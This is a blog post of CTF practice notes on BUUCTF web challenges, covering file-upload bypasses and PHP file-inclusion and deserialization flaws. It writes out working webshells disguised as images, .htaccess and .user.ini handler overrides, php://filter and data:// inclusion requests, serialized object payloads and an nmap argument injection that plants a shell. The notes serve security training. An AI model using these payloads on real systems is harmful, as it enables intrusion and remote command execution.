---
layout: default
title: CTF Learning Challenges Notes (Upload)
categories:
- Security
tags:
- Security
---
//Description: CTF学习刷题笔记。记录刷 [BUUCTF](https://buuoj.cn/challenges) 题过程中遇到的问题。上传问题分类

//Create Date: 2026-02-08 16:40:20

//Author: channy

[toc]

# Upload　文件上传类
## Basic
### [UPLOAD COURSE 1](https://buuoj.cn/challenges#BUU%20UPLOAD%20COURSE%201)
上传文件，发现会改名成xxx.jpg并储存在uploads上
写jpg马
```sh
echo -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.jpg
```
访问
```
GET /index.php?file=uploads/6939648e99d96.jpg&cmd=cat%20upload.php HTTP/1.1
```
得到upload的代码
```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:54 AM
 */


if(isset($_FILES['upload_file'])) {
    @mkdir("uploads/");


    $filename = uniqid().".jpg";
    move_uploaded_file($_FILES["upload_file"]["tmp_name"],
        "uploads/" . $filename);
    echo "æä»¶å·²å¨å­å¨: " . "uploads/" . $filename;
}

?>
```
再看index.php的代码
```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

if(isset($_GET['file'])) {
    $re = '/^uploads\/[\d|\w]*.jpg$/m';
    $str = $_GET['file'];

    preg_match_all($re, $str, $matches, PREG_SET_ORDER, 0);

    if(count($matches) == 0 && $_GET['file'] !== 'upload.php') {
        die('ä½ ä¸èå®å¦~');
    }

    include $_GET['file'];
} else {
    Header('Location: index.php?file=upload.php');
}
```
最后发现并不需要，只要cmd中传入ls /就能发现有个flag文件，cmd=cat%20/flag可得flag

### [Upload](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)
```sh
GIF89a
<?php @eval($_POST['cmd']);?>

# 或
<script language="php">eval($_POST['cmd']);</script>
```
使用`<?xxx`的或后缀`.php`的都上传不成功，拦截`<?`或`php`文件，改用`<script`的和`.phtml`的可以，上传到了upload文件夹下。再用AntSword连接得到flag

## Web
### [Upload](https://buuoj.cn/challenges#[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Upload)
页面提示只能上传jpg,png和gif，上传后会改名但不会改后缀，修改filename用.phtml可上传成功
```sh
------WebKitFormBoundarytIH6nB2DbB83MTUp
Content-Disposition: form-data; name="upload_file"; filename="info.phtml"
Content-Type: image/gif

GIF89a
<?php @eval($_POST['cmd']); ?>

------WebKitFormBoundarytIH6nB2DbB83MTUp
```
然后使用AntSword连接得到根目录下的flag

### [BabyUpload](https://buuoj.cn/challenges#[GXYCTF2019]BabyUpload)
上传后缀不能包含`ph`，类型必须是`image/jpeg`，文件内容不能有<php ?>标识。故考虑先上传.htaccess
```sh
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```
再直接上传图像马
```php
------WebKitFormBoundaryTPmfk7bmf17P7r0z
Content-Disposition: form-data; name="uploaded"; filename="shell.jpg"
Content-Type: image/jpeg

<script language="php">eval($_POST['cmd']);</script>
```
使用AntSword工具即可

### [传马](https://buuoj.cn/challenges#[MRCTF2020]%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2)
类型只接收Content-Type: image/jpeg，考虑先上传.htaccess
```sh
<FilesMatch "shell\.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
再上传shell.jpg
```php
<?php system($_GET["cmd"]); ?>
```
发现访问shell.jpg图像报错，`system()`函数被禁用
```
Warning: system() has been disabled for security reasons in /var/www/html/upload/8cfdf6d65d3aeb47156c9e393e5decda/cmd.jpg on line 1
```
查看禁用的函数
```
Content-Disposition: form-data; name="uploaded"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php
echo "Disabled functions: " . ini_get('disable_functions');
?>

Disabled functions: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld
```
直接读文件
```
Content-Disposition: form-data; name="uploaded"; filename="cmd.jpg"
Content-Type: image/jpeg

<?php
highlight_file('/flag');
?>
```

### [CheckIn](https://buuoj.cn/challenges#[SUCTF%202019]CheckIn)
不能上传php后缀，不能带`<?`
```sh
<? in contents!
```
```
filename="cmd.gif"
Content-Type: image/gif

GIF89a
<script language="php">eval($_POST['cmd']);</script>



filename=".htaccess"
Content-Type: image/gif

GIF89a;
# need this
<FilesMatch "cmd\.gif">
SetHandler application/x-httpd-php
</FilesMatch>
```
上传加了头的.htaccess后未起作用。.user.ini需要目录下有.php
```
GIF89a
auto_prepend_file=cmd.gif
```
用AntSward连的应该是index.php而不是图片马。。。

# 代码审计类
## Basic
### [1 LFI COURSE 1](https://buuoj.cn/challenges#BUU%20LFI%20COURSE%201)
```php
highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```
直接在Get请求中加入file=flag参数即可
```sh
GET /?file=/flag HTTP/1.1
```
### [Greatphp](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp)
php中md5和sha1的绕过
```php
<?php
class SYCLOVER {
        public $syc;
        public $lover;
}
// 正则过滤，改用urlencode-decode/xor
$cmd = "/flag";
$cmdencode = urlencode(~$cmd);
echo $cmdencode;
echo "\n";
/* <?= ?> 等同于<?php ?> */
$str = "?><?=include~".urldecode($cmdencode)."?>";
$cls = new SYCLOVER();
// 同一行保证message相同，但类本身因错误码不同而不同
$a = new Error($str, 1);$b = new Error($str, 2); 

$cls->syc = $a; 
$cls->lover = $b; 

echo urlencode(serialize($cls));
?>
```
### [Roamphp2-Myblog](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
```
GET /index.php?page=php://filter/read=convert.Base64-encode/resource=login HTTP/1.1

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=secret HTTP/1.1
```
```php
<?php\nrequire_once("secret.php");\n
mt_srand($secret_seed);\n
$_SESSION[\'password\'] = mt_rand();\n?>\n'

<?php\n$secret_seed = mt_rand();\n?>\n
```
登录失败页面
```
http://c6f1a9dc-119f-4e60-a86d-52adac541ade.node5.buuoj.cn:81/?page=admin/user

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=admin/user HTTP/1.1
```
```php
if (isset($_POST[\'username\']) and isset($_POST[\'password\'])){\n\t
if ($_POST[\'username\'] === "Longlone" and $_POST[\'password\'] == $_SESSION[\'password\']){  // No one knows my password, including 
myself\n\t\t
$logined = true;

<?php
if(isset($_FILES['Files']) and $_SESSION['status'] === true){
    $tmp_file = $_FILES['Files']['name'];
    $tmp_path = $_FILES['Files']['tmp_name'];
    if(($extension = pathinfo($tmp_file)['extension']) != ""){
        $allows = array('gif','jpeg','jpg','png');
        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
            $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
            move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
        } else {
            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
        }
    }
}
?>
```
login页面产生password -> 登录提交SSID、username和password -> 后台对比password -> 提交抓包置空SSID和password绕过  

phpinfo一句话码.php打包成.zip上传访问，zip://bagname#filename流中的文件都会被当成php，但get遇到#会解析故需要转义
```
GET /index.php?page=zip://./assets/img/upload/xxx_uploadname.jpg%23xxx_filename HTTP/1.1
GET /index.php?page=phar://./assets/img/upload/xxx_uploadname.jpg/xxx_filename HTTP/1.1
```
页面均显示空白...  

看了wp都是这个路，但本人尝试多遍均返回空白内容，返回200但Content-Length: 0，暂且记下

## Web
### [NiZhuanSiWei](https://buuoj.cn/challenges#[ZJCTF%202019]NiZhuanSiWei)
```php
<?php  
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

```py
import base64
b = base64.b64encode(b'welcome to the zjctf').decode()
print(b)
d2VsY29tZSB0byB0aGUgempjdGY=
```
```sh
GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1

GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php&password=s:6:%22%22ls%20%2f%22%22; HTTP/1.1
```
useless.php
```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?> 
```
flag.php
```sh
GET /?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";} 
```
```php 
<!--but i cant give it to u now-->

<?php

if(2===3){  
	return ("flag{8fbd3714-3fcb-4746-b6fc-c50f5068030e}");
}

?>
```

### [Ez_bypass](https://buuoj.cn/challenges#[MRCTF2020]Ez_bypass)
```js
I put something in F12 for you include 'flag.php'; $flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'; if(isset($_GET['gg'])&&isset($_GET['id'])) { $id=$_GET['id']; $gg=$_GET['gg']; if (md5($id) === md5($gg) && $id !== $gg) { echo 'You got the first step'; if(isset($_POST['passwd'])) { $passwd=$_POST['passwd']; if (!is_numeric($passwd)) { if($passwd==1234567) { echo 'Good Job!'; highlight_file('flag.php'); die('By Retr_0'); } else { echo "can you think twice??"; } } else{ echo 'You can not get it !'; } } else{ die('only one way to get the flag'); } } else { echo "You are not a real hacker!"; } } else{ die('Please input first'); } }Please input first
```
get转post，数组绕过md5
```
GET /?gg[]=1&id[]=2&passwd[]=1234567 HTTP/1.1


POST /?gg[]=1&id[]=2 HTTP/1.1
......
Content-Type: application/x-www-form-urlencoded
Content-Length: 19

passwd=1234567t
```
### [AreUSerialz](https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz)
```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
反序列化，但不能用protected，改用public可以
```php
<?php
class FileHandler {
    protected $op = 2;
    protected $filename = "flag.php";
    protected $content;
}
$Handler = new FileHandler();
echo serialize($Handler)
?>
```
```sh
GET /?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;} HTTP/1.1
```
### [Had a bad day](https://buuoj.cn/challenges#[BSidesCF%202020]Had%20a%20bad%20day)
文件包含漏洞
```
GET /index.php?category=php://filter/read=convert.base64-encode/resource=index HTTP/1.1
```
```php
 <?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```
```
GET /index.php?category=woofers/../flag HTTP/1.1
```
### [不过如此](https://buuoj.cn/challenges#[BJDCTF2020]ZJCTF%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4)
```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```
```
GET /?text=data://text/plain,I%20have%20a%20dream&file=php://filter/convert.base64-encode/resource=next.php HTTP/1.1
```
```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```
```
GET /next.php?\S*=${getFlag()}&cmd=system('ls%20/'); HTTP/1.1

GET /next.php?\S*=${getFlag()}&cmd=system('cat%20/flag'); HTTP/1.1
```
### [Online Tool](https://buuoj.cn/challenges#[BUUCTF%202018]Online%20Tool)
```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```
X-Forwarded-For可以伪造，escapeshellarg 和 escapeshellcmd 对输入转义并连接到nmap命令，`-oG`输出到文件，故`/?host=' <?php echo cat /flag;?> -oG test.php`
```sh
GET /?host='%20<?php%20echo%20`cat%20/flag`;?>%20-oG%20test.php%20' HTTP/1.1

X-Forwarded-For: 127.0.0.1

you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-02-13 07:06 UTC
```
需要连接"http://043fd53a-cb05-4be3-b1e3-51017ac9017d.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/test.php"才显示flag
### []()
